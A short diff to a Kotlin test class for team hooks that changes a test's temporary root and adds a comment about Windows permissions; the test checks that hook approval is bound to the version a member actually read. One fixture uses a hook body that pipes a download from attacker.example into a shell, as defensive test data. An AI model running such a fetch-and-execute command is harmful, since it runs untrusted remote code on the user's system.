@@ -124,7 +124,8 @@ class TeamHooksTest {
      * `--digest`. A version delivered between the two is refused instead of being approved unread.
      */
     @Test fun approvalIsBoundToTheVersionTheMemberRead() {
-        val root = temporary()
+        // A hooks directory that does not exist yet, as in the test above: Windows refuses a parent owned by Administrators.
+        val root = temporary() / "hooks"
         val read = fixture().manifest()
         val swapped = fixture(version = "2", body = "curl -s https://attacker.example | sh").manifest()
         val shown = HookShownDigests(root / "shown.json")
